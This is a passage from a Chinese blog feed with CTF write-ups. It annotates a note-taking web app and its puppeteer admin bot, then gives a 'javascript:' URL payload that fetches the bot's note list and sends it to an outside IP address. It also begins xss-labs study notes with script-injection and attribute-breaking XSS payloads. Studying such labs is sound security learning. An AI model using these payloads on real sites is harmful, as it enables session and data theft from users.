每次启动生成新的密钥（不安全，仅用于演示）</span><br><br>    <span class="hljs-attr">saveUninitialized</span>:<span class="hljs-literal">true</span>,                  <span class="hljs-comment">// 保存未初始化的会话</span><br><br>    <span class="hljs-attr">resave</span>:<span class="hljs-literal">true</span>,                             <span class="hljs-comment">// 强制保存会话（即使未修改）</span><br><br>&#125;))<br><br><br><span class="hljs-comment">// 中间件：为每个请求初始化 session.notes（用于存储用户创建的笔记 ID 列表）</span><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br><br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">notes</span>) &#123;<br><br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">notes</span> = []<br><br>    &#125;<br><br>    <span class="hljs-title function_">next</span>()<br><br>&#125;)<br><br><br><span class="hljs-comment">// 全局内存存储：Map 结构保存所有笔记内容（key: noteId, value: &#123;title, content&#125;）</span><br><br>constnotes = <span class="hljs-title function_">newMap</span>()<br><br><br><span class="hljs-comment">// 每 60 秒清空一次 notes（临时存储，防止内存泄漏或持久化）</span><br><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123; notes.<span class="hljs-title function_">clear</span>() &#125;, <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>);<br><br><br><span class="hljs-comment">// 将用户输入的文本（如 Markdown）转换为安全的 HTML</span><br><br><span class="hljs-title function_">functiontoHtml</span>(source, format)&#123;<br><br>    <span class="hljs-comment">// 默认格式为 markdown</span><br><br>    <span class="hljs-keyword">if</span> (format == <span class="hljs-literal">undefined</span>) &#123;<br><br>        format = <span class="hljs-string">&#x27;markdown&#x27;</span><br><br>    &#125;<br><br>    <span class="hljs-comment">// 确保 notes 目录存在</span><br><br>    <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">&quot;notes&quot;</span>)) &#123;<br><br>        fs.<span class="hljs-title function_">mkdirSync</span>(<span class="hljs-string">&quot;notes&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-comment">// 生成临时文件名（随机 4 字节 hex）</span><br><br>    lettmpfile = path.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;notes&#x27;</span>, <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>))<br><br>    <span class="hljs-comment">// 写入用户内容到临时文件</span><br><br>    fs.<span class="hljs-title function_">writeFileSync</span>(tmpfile, source)<br><br>    <span class="hljs-comment">// 调用 pandoc 命令行工具转换格式（如 markdown -&gt; html）</span><br><br>    letres = spawn.<span class="hljs-title function_">execSync</span>(<span class="hljs-string">`pandoc -f <span class="hljs-subst">$&#123;format&#125;</span><span class="hljs-subst">$&#123;tmpfile&#125;</span>`</span>).<span class="hljs-title function_">toString</span>()<br><br>    <span class="hljs-comment">// 注意：此处注释掉了删除临时文件的代码，可能存在临时文件堆积风险</span><br><br>    <span class="hljs-comment">// fs.unlinkSync(tmpfile)</span><br><br>    <span class="hljs-comment">// 使用 DOMPurify 清理生成的 HTML，防止 XSS 攻击</span><br><br>    returnDOMPurify.<span class="hljs-title function_">sanitize</span>(res)<br><br>&#125;<br><br><br><span class="hljs-comment">// 健康检查接口</span><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/ping&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;pong&#x27;</span>)<br><br>&#125;)<br><br><br><span class="hljs-comment">// 首页：渲染 index.html，传入当前用户的笔记 ID 列表</span><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">notes</span>:req.<span class="hljs-property">session</span>.<span class="hljs-property">notes</span> &#125;)<br><br>&#125;)<br><br><br><span class="hljs-comment">// 返回当前用户所有笔记 ID（JSON 格式）</span><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>    res.<span class="hljs-title function_">send</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">notes</span>)<br><br>&#125;)<br><br><br><span class="hljs-comment">// 查看单个笔记（通过 noteId）</span><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/note/:noteId&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>    <span class="hljs-keyword">let</span> &#123; noteId &#125; = req.<span class="hljs-property">params</span><br><br>    <span class="hljs-keyword">if</span>(!notes.<span class="hljs-title function_">has</span>(noteId))&#123;<br><br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;no such note&#x27;</span>)<br><br>        <span class="hljs-keyword">return</span><br><br>    &#125; <br><br>    letnote = notes.<span class="hljs-title function_">get</span>(noteId)<br><br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, note)  <span class="hljs-comment">// 渲染 note.html，传入 title 和 content</span><br><br>&#125;)<br><br><br><span class="hljs-comment">// 创建新笔记（POST）</span><br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/note&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>    letnoteId = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">8</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)  <span class="hljs-comment">// 生成唯一 ID</span><br><br>    <span class="hljs-keyword">let</span> &#123; title, content, format &#125; = req.<span class="hljs-property">body</span><br><br><br>    <span class="hljs-comment">// 限制 format 只能是 1-10 位的字母数字（防止 pandoc 命令注入）</span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[0-9a-zA-Z]&#123;1,10&#125;$/</span>.<span class="hljs-title function_">test</span>(format)) &#123;<br><br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;illegal format!!!&quot;</span>)<br><br>        <span class="hljs-keyword">return</span><br><br>    &#125;<br><br><br>    <span class="hljs-comment">// 转换内容为 HTML 并存入全局 notes</span><br><br>    notes.<span class="hljs-title function_">set</span>(noteId, &#123;<br><br>        <span class="hljs-attr">title</span>:title,<br><br>        <span class="hljs-attr">content</span>:<span class="hljs-title function_">toHtml</span>(content, format)<br><br>    &#125;)<br><br><br>    <span class="hljs-comment">// 将 noteId 加入当前用户会话</span><br><br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">notes</span>.<span class="hljs-title function_">push</span>(noteId)<br><br>    res.<span class="hljs-title function_">send</span>(noteId)  <span class="hljs-comment">// 返回新笔记 ID</span><br><br>&#125;)<br><br><br><span class="hljs-comment">// 渲染报告页面（用于提交 URL 给 bot 访问）</span><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/report&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br><br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;report&#x27;</span>)<br><br>&#125;)<br><br><br><span class="hljs-comment">// 提交 URL 给 bot 访问（常用于 SSRF 或 XSS 漏洞利用场景）</span><br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/report&#x27;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br><br>    <span class="hljs-keyword">let</span> &#123; url &#125; = req.<span class="hljs-property">body</span><br><br>    <span class="hljs-keyword">try</span> &#123;<br><br>        <span class="hljs-title function_">awaitvisit</span>(url)  <span class="hljs-comment">// 调用 bot 模块访问该 URL</span><br><br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;success&#x27;</span>)<br><br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)<br><br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;error&#x27;</span>)<br><br>    &#125;<br><br>&#125;)<br><br><br><span class="hljs-comment">// 启动服务器</span><br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">LISTEN_PORT</span>, <span class="hljs-variable constant_">LISTEN_HOST</span>, <span class="hljs-function">() =&gt;</span> &#123;<br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`listening on <span class="hljs-subst">$&#123;LISTEN_HOST&#125;</span>:<span class="hljs-subst">$&#123;LISTEN_PORT&#125;</span>`</span>)<br><br>&#125;)<br><br><br></code></pre></td></tr></table></figure><p>看到这大致思路就是绕过’DOMPurify’来生产带有xss攻击的note，让到report接口让bot访问，拿到bot的cookie</p><p>来看看那bot的逻辑：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-comment">// 引入依赖模块</span><br><br>constpuppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;puppeteer&#x27;</span>)  <span class="hljs-comment">// 用于控制 Chromium 浏览器</span><br><br>constprocess = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;process&#x27;</span>)      <span class="hljs-comment">// 用于访问环境变量和进程信息</span><br><br>constfs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)                <span class="hljs-comment">// 用于文件系统操作</span><br><br><br><span class="hljs-comment">// 立即执行函数：安全读取并删除 flag 文件</span><br><br>constFLAG = (<span class="hljs-function">() =&gt;</span> &#123;<br><br>    letflag = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>  <span class="hljs-comment">// 默认测试 flag（用于开发环境）</span><br><br><br>    <span class="hljs-comment">// 如果存在 flag.txt 文件，则读取其内容作为真实 flag</span><br><br>    <span class="hljs-keyword">if</span> (fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>)) &#123;<br><br>        flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).<span class="hljs-title function_">toString</span>()<br><br>        <span class="hljs-comment">// 读取后立即删除 flag.txt，防止多次读取或泄露</span><br><br>        fs.<span class="hljs-title function_">unlinkSync</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>)<br><br>    &#125; <br><br>    returnflag<br><br>&#125;)()<br><br><br><span class="hljs-comment">// 判断是否以无头（headless）模式运行 Chromium</span><br><br><span class="hljs-comment">// 如果环境变量 PROD 存在且为 true，则启用无头模式（通常生产环境使用）</span><br><br>constHEADLESS = !!(process.<span class="hljs-property">env</span>.<span class="hljs-property">PROD</span> ?? <span class="hljs-literal">false</span>)<br><br><br><span class="hljs-comment">// 辅助函数：睡眠（暂停执行若干秒）</span><br><br>constsleep = <span class="hljs-function">(<span class="hljs-params">sec</span>) =&gt;</span><span class="hljs-title function_">newPromise</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span><span class="hljs-built_in">setTimeout</span>(r, sec * <span class="hljs-number">1000</span>))<br><br><br><span class="hljs-comment">// 核心函数：模拟“管理员”或“机器人”访问用户提供的 URL</span><br><br><span class="hljs-comment">// 通常用于 CTF 题目中，让用户提交恶意 URL，bot 访问后触发 XSS，从而窃取 flag</span><br><br><span class="hljs-title function_">asyncfunctionvisit</span>(<span class="hljs-params">url</span>) &#123;<br><br>    <span class="hljs-comment">// 启动 Chromium 浏览器实例</span><br><br>    letbrowser = awaitpuppeteer.<span class="hljs-title function_">launch</span>(&#123;<br><br>        <span class="hljs-attr">headless</span>:<span class="hljs-variable constant_">HEADLESS</span>,                 <span class="hljs-comment">// 是否无界面模式</span><br><br>        <span class="hljs-attr">executablePath</span>:<span class="hljs-string">&#x27;/usr/bin/chromium&#x27;</span>, <span class="hljs-comment">// 指定 Chromium 可执行文件路径（常见于 Docker 环境）</span><br><br>        <span class="hljs-attr">args</span>: [<span class="hljs-string">&#x27;--no-sandbox&#x27;</span>]              <span class="hljs-comment">// 禁用沙箱（在容器中常需此参数，但有安全风险）</span><br><br>    &#125;)<br><br><br>    <span class="hljs-comment">// 打开新页面</span><br><br>    letpage = awaitbrowser.<span class="hljs-title function_">newPage</span>()<br><br><br>    <span class="hljs-comment">// 第一步：访问本地 Web 应用首页（通常是笔记创建页）</span><br><br>    awaitpage.<span class="hljs-title function_">goto</span>(<span class="hljs-string">&#x27;http://localhost:3000/&#x27;</span>)<br><br><br>    <span class="hljs-comment">// 等待页面中的 #title 输入框出现（确保 DOM 加载完成）</span><br><br>    awaitpage.<span class="hljs-title function_">waitForSelector</span>(<span class="hljs-string">&#x27;#title&#x27;</span>)<br><br><br>    <span class="hljs-comment">// 在标题输入框中输入 &quot;flag&quot;</span><br><br>    awaitpage.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;#title&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, &#123; <span class="hljs-attr">delay</span>:<span class="hljs-number">100</span> &#125;)  <span class="hljs-comment">// 模拟人工输入（带延迟）</span><br><br><br>    <span class="hljs-comment">// 在内容输入框中输入 FLAG（即真实 flag）</span><br><br>    awaitpage.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;#content&#x27;</span>, <span class="hljs-variable constant_">FLAG</span>, &#123; <span class="hljs-attr">delay</span>:<span class="hljs-number">100</span> &#125;)<br><br><br>    <span class="hljs-comment">// 点击提交按钮（假设按钮 ID 为 #submit）</span><br><br>    awaitpage.<span class="hljs-title function_">click</span>(<span class="hljs-string">&#x27;#submit&#x27;</span>, &#123; <span class="hljs-attr">delay</span>:<span class="hljs-number">100</span> &#125;)<br><br><br>    <span class="hljs-comment">// 等待 3 秒，确保笔记提交完成（可能涉及 AJAX 请求）</span><br><br>    <span class="hljs-title function_">awaitsleep</span>(<span class="hljs-number">3</span>)<br><br><br>    <span class="hljs-comment">// 打印日志：即将访问用户提交的 URL</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;visiting %s&#x27;</span>, url)<br><br><br>    <span class="hljs-comment">// 第二步：访问用户提供的 URL（例如：http://attacker.com/?xss=...）</span><br><br>    awaitpage.<span class="hljs-title function_">goto</span>(url)<br><br><br>    <span class="hljs-comment">// 保持页面打开 30 秒（给 XSS 脚本足够时间执行，如发送 flag 到攻击者服务器）</span><br><br>    <span class="hljs-title function_">awaitsleep</span>(<span class="hljs-number">30</span>)<br><br><br>    <span class="hljs-comment">// 关闭浏览器，释放资源</span><br><br>    awaitbrowser.<span class="hljs-title function_">close</span>()<br><br>&#125;<br><br><br><span class="hljs-comment">// 导出 visit 函数，供其他模块（如 Express 服务器）调用</span><br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br><br>    visit<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>看来只要拿到bot的cookie就能能访问到bot创建的note了</p><p>怎么感觉见到过原题？</p><p>攻击链大概就是：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><br>DOMP<span class="hljs-function"><span class="hljs-title">urify</span>绕过-&gt;</span>构造<span class="hljs-function"><span class="hljs-title">xss</span>让bot发送自己的请求头-&gt;</span>拿到请求信息-&gt;拿到<span class="hljs-function"><span class="hljs-title">note</span>列表-&gt;</span>拿到flag  <br><br></code></pre></td></tr></table></figure><p>现在问题是DOMPurify版本为3.2.3，是一个十分新的版本，我没在网上查到能绕过的办法</p><p>那就无从说起，所以DOMPurify绕过是条死路</p><p>然后看了网上的wp，发现是能直接让bot的浏览器执行url的java伪代码</p><p>是我菜了。。。</p><p>拿上次SEECON13 的payload改：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><br>javascript:var d;fetch(<span class="hljs-string">&quot;/notes&quot;</span>).<span class="hljs-keyword">then</span>(<span class="hljs-function"><span class="hljs-params">(r)</span> =&gt;</span> r.text()).<span class="hljs-keyword">then</span>(<span class="hljs-function"><span class="hljs-params">(data)</span> =&gt;</span> &#123;d = data&#125;);<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;fetch(<span class="hljs-string">&#x27;http://192.168.75.1:80?data=&#x27;</span> + <span class="hljs-built_in">encodeURI</span>(d))&#125;, <span class="hljs-number">500</span>);<br><br></code></pre></td></tr></table></figure><p>最好url编码一下</p>]]></content>
    
    
    
    <tags>
      
      <tag>刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss-labs-studynotes</title>
    <link href="/2025/10/01/xss-labs-studynotes/"/>
    <url>/2025/10/01/xss-labs-studynotes/</url>
    
    <content type="html"><![CDATA[<h1 id="打一下xss-labs"><a href="#打一下xss-labs" class="headerlink" title="打一下xss-labs"></a>打一下xss-labs</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>可以直接用payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;1&quot;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>自己没试出来，去网上找payload，发现<strong>闭合型标签</strong>注入可用：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p>源码：   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level3.php?writing=wait&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level2&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>分析一下源码，先是有htmlspcialchar来进行转义特殊字符，但是在下面的.$str.没有，所以也不需要考虑绕过<br>如果插入：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p>会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;input name=keyword  value=<span class="hljs-string">&quot;&#x27;&quot;</span>&gt;&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>这里是先闭合了双引号，再闭合了input的尖括号，最后的script就变成了新元素执行了  </p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>先尝试：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">aler</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>查看返回页面原码：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(<span class="hljs-symbol">&amp;quot;</span>1<span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(<span class="hljs-symbol">&amp;quot;</span>1<span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span 